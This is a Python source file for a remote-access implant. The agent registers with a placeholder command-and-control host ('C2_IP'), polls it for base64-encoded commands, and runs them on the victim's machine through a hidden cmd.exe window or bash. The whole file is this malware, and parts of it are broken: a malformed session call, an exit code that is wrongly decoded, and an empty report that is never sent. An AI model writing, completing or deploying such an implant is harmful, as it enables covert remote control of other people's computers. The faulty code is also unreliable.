import requests 
import base64
import time
import logging
import subprocess
import os
import platform
import requests

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s') 
c2_server = "http://C2_IP"
# token = None
session = requests.Session*()

def execute_command(cmd):
    '''
    function takes in base64 encoded cmd, decodes it 
    then runs the execution pipeline
    '''

    #output dictionary
    data = {
        'output' : None,
        'error' : None,
        'code' : None,
    } 

    try:
        decoded_msg = base64.b64decode(cmd).decode('utf-8').strip()
        if not decoded_msg:
            data['error'] = 'No command recieved. Execution discontinued'
            return data 

        ops = find_os()

        os_type = ops.get('type')
        os_arch = ops.get('arch')

        if os_type == 'windows':

            process = subprocess.run(
                ['cmd.exe', '/c', decoded_msg],
                capture_output=True,
                text=True,
                timeout=30,
                check=False, 
                creationflags=subprocess.CREATE_NO_WINDOW
            )

        elif os_type == 'linux':

            process = subprocess.run(
                ['/bin/bash', '-c', decoded_msg],
                capture_output=True,
                text=True,
                timeout=30,
                check=False
            )

        else:
            data['error'] = f'Unsupported OS={os_type}'
            return data
        
        opt = process.stdout.strip()
        err = process.stderr.strip()
        excode = process.returncode

        logging.debug(f'Command <<< {opt} >>> has been executed successfully')
        logging.debug(f'Output recieved: {opt}')
        logging.debug(f'Errors recieved : {excode}')
                      
        data['output'] = opt
        data['error'] = err
        data['code'] = excode

        return data

    except subprocess.TimeoutExpired:
        logging.error(f'Command {decoded_msg} execution timeout')
        data['error'] = 'Command execution timeout('

        return data
    except Exception as e:
        logging.error(f'Error occured during command execution: {str(e)}')
        data['error'] = str(e) 

        return data 

def find_os():
    '''
    Function to retrieve system OS information 
    '''
    os_info = {
        "type": None, 
        "arch": None,
        "timestamp": time.time()
    }

    system = platform.system().lower()
    if "linux" in system:
        os_info['type'] = 'linux'
    elif "windows" in system:
        os_info['type'] = 'windows'
    else:
        os_info['type'] = 'unknown'

    os_info['arch'] = platform.machine() 

    return os_info

def check_in():
    '''
    Function to check in with the server and verify operation status
    '''
    ops = find_os()
    data = {
        'aid': 1, 
        'ops': ops['type']
    }

    try:
        resp = session.post(f"{c2_server}/overview", json=data, verify=False, timeout=10)
        # verify = false since it is a testing environment - shd be set to true if deployed in prod

        if resp.status_code == 200 :
            data = resp.json()
            token = data.get('token')

            if token:
                logging.info(f'Agent registered successfully with token: {token}')

                return True 
            else:
                logging.error(f'Registration failed. No token recieved')

                return False
        else:
            logging.error(f'Registration Error : {resp.status_code} - {resp.text}')

            return False 
    except Exception as e:
        logging.error(f'Error occured during registration: {e}')\
        
        return False 

def get_comms():
    '''
    validates itself with token, then the 
    function that calls the valid server endpoint to recieve commands to execute on victim 
    '''

    try:
        resp = session.post(f"{c2_server}/cmd", verify=False, timeout=10)
        # verify = false since it is a testing environment - shd be set to true if deployed in prod
        if resp.status_code == 200:
            data = resp.json()

            if data.get('status') == 'active':
                command = data.get('cmd')
                if command:
                    logging.info(f'Command recieved: {command}')
                    res = execute_command(command)

                    if not res['output']:
                        logging.error(f'Error occured in command execution : {res['error']}')

                    opt = base64.b64encode(res['output'].encode('utf-8'))
                    err = base64.b64encode(res['error'].encode('utf-8'))
                    excode = base64.b64decode(res['code'].encode('utf-8'))

                    report = {

                        
                    }
                else:
                    logging.info('No command recieved')
        else:
            logging.error(f'Error occured during command retrieval: {resp.status_code} - {resp.text}')
    except Exception as e:
        logging.error(f'Error occured during command retrieval: {e}')
    
if __name__ == '__main__':
    check_in = check_in()

    while(check_in):
        get_comms()
        time.sleep(5)